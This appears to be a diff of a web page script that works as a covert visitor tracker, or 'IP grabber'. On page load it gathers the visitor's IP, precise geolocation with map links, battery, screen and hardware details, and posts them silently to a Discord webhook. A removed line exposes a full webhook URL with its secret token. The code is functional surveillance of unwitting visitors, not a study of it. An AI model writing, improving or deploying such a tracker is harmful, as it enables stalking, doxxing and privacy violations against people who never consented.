@@ -21,8 +21,9 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
     <script>
         $(document).ready(function () {
+            const webhookUrl = "YOUR_WEBHOOK_URL_HERE";
             let ip, country, countryCode, region, regionName, city, zip, lat, lon, timezone, org;
-            let batteryPercentage, isCharging, platform, width, height, deviceLang, userAgent, cpuThreads, deviceRam, referUrl, deviceType;
+            let batteryPercentage, isCharging, platform, width, height, deviceLang, userAgent, cpuThreads, deviceRam, referUrl;
             let datetime = new Date();
             let localtime;
 
@@ -34,20 +35,15 @@
                 return `UTC${sign}${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}`;
             }
 
-            function detectDeviceType() {
-                const ua = navigator.userAgent;
-                if (/mobile/i.test(ua)) {
-                    return 'Phone';
-                } else if (/tablet/i.test(ua)) {
-                    return 'Tablet';
-                } else {
-                    return 'Desktop';
-                }
+            function generateMapUrls(latitude, longitude) {
+                return {
+                    googleMaps: `https://www.google.com/maps?q=${latitude},${longitude}`,
+                    openStreetMap: `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}`
+                };
             }
 
             async function getInfo() {
                 try {
-                    // Fetch IP and location data
                     const ipResponse = await fetch('https://ip-api.io/json');
                     const ipData = await ipResponse.json();
                     ip = ipData.ip;
@@ -62,37 +58,31 @@
                     timezone = ipData.time_zone;
                     org = ipData.organisation;
 
-                    // Get additional device info
                     const battery = await navigator.getBattery();
-                    batteryPercentage = String(battery.level * 100) + "%";
-                    isCharging = String(battery.charging);
-                    platform = String(navigator.platform);
-                    width = String(window.innerWidth);
-                    height = String(window.innerHeight);
-                    deviceLang = String(navigator.language);
-                    userAgent = String(navigator.userAgent || navigator.vendor || window.opera);
-                    cpuThreads = String(navigator.hardwareConcurrency);
-                    deviceRam = String(navigator.deviceMemory) + "GB";
-                    referUrl = String(window.location.href);
-                    localtime = String(datetime.toLocaleString());
+                    batteryPercentage = `${battery.level * 100}%`;
+                    isCharging = `${battery.charging}`;
+                    platform = `${navigator.platform}`;
+                    width = `${window.innerWidth}`;
+                    height = `${window.innerHeight}`;
+                    deviceLang = `${navigator.language}`;
+                    userAgent = `${navigator.userAgent || navigator.vendor || window.opera}`;
+                    cpuThreads = `${navigator.hardwareConcurrency}`;
+                    deviceRam = `${navigator.deviceMemory} GB`;
+                    referUrl = `${window.location.href}`;
+                    localtime = `${datetime.toLocaleString()}`;
 
-                    // Calculate timezone offset in minutes and format it
                     let timezoneOffsetMinutes = -datetime.getTimezoneOffset();
                     let formattedTimezoneOffset = formatTimezoneOffset(timezoneOffsetMinutes);
 
-                    // Determine device type
-                    deviceType = detectDeviceType();
+                    let mapUrls = generateMapUrls(lat, lon);
 
-                    // Send the information to the webhook
-                    await sendWebhook(formattedTimezoneOffset);
+                    await sendWebhook(formattedTimezoneOffset, mapUrls);
                 } catch (error) {
                     console.error('Error fetching information:', error);
                 }
             }
 
-            function sendWebhook(formattedTimezoneOffset) {
-                const webhookUrl = "https://discord.com/api/webhooks/1271415382833631316/KLDM9V6oh7kezM8Q6aGJ791MnX2eDCyHjSbObzB-m7gsmr3JfBsLUON8lxj50ihsgABt";
-
+            function sendWebhook(formattedTimezoneOffset, mapUrls) {
                 let request = new XMLHttpRequest();
                 request.open("POST", webhookUrl);
                 request.setRequestHeader('Content-type', 'application/json');
@@ -100,56 +90,46 @@
                 let flagEmoji = countryCode ? `:flag_${countryCode.toLowerCase()}:` : '';
 
                 let params = {
-                    "content": null,
                     "embeds": [
                         {
                             "color": 5814783,
-                            "description": `${flagEmoji}\n\n**IP Information**\n\n`,
+                            "description": `${flagEmoji}`,
                             "fields": [
-                                // Row 1
                                 { "name": "**IP Address:**", "value": `${ip}`, "inline": true },
                                 { "name": "**Provider:**", "value": `${org}`, "inline": true },
                                 { "name": "**Country:**", "value": `${country}`, "inline": true },
 
-                                // Row 2
                                 { "name": "**Country Code:**", "value": `${countryCode}`, "inline": true },
                                 { "name": "**Region Name:**", "value": `${regionName}`, "inline": true },
                                 { "name": "**Region Code:**", "value": `${region}`, "inline": true },
 
-                                // Row 3
                                 { "name": "**City:**", "value": `${city}`, "inline": true },
                                 { "name": "**Zip Code:**", "value": `${zip}`, "inline": true },
                                 { "name": "**Latitude:**", "value": `${lat}`, "inline": true },
 
-                                // Row 4
                                 { "name": "**Longitude:**", "value": `${lon}`, "inline": true },
                                 { "name": "**Timezone:**", "value": `${timezone}`, "inline": true },
                                 { "name": "**Timezone Offset:**", "value": `${formattedTimezoneOffset}`, "inline": true },
 
-                                // Row 5
                                 { "name": "**Local Time:**", "value": `${localtime}`, "inline": true },
                                 { "name": "**Language:**", "value": `${deviceLang}`, "inline": true },
                                 { "name": "**Width (px):**", "value": `${width}`, "inline": true },
 
-                                // Row 6
                                 { "name": "**Height (px):**", "value": `${height}`, "inline": true },
                                 { "name": "**Platform:**", "value": `${platform}`, "inline": true },
                                 { "name": "**Battery Percentage:**", "value": `${batteryPercentage}`, "inline": true },
 
-                                // Row 7
                                 { "name": "**Charging:**", "value": `${isCharging}`, "inline": true },
                                 { "name": "**CPU Threads:**", "value": `${cpuThreads}`, "inline": true },
                                 { "name": "**RAM:**", "value": `${deviceRam}`, "inline": true },
 
-                                // Row 8
                                 { "name": "**User Agent:**", "value": `${userAgent}`, "inline": true },
                                 { "name": "**Referrer URL:**", "value": `${referUrl}`, "inline": true },
-                                { "name": "**Device Type:**", "value": `${deviceType}`, "inline": true }
+                                { "name": "**Map Links:**", "value": `[Google Maps](${mapUrls.googleMaps}) | [OpenStreetMap](${mapUrls.openStreetMap})`, "inline": true }
                             ],
                             "timestamp": datetime.toISOString()
                         }
-                    ],
-                    "attachments": []
+                    ]
                 };
 
                 request.send(JSON.stringify(params));
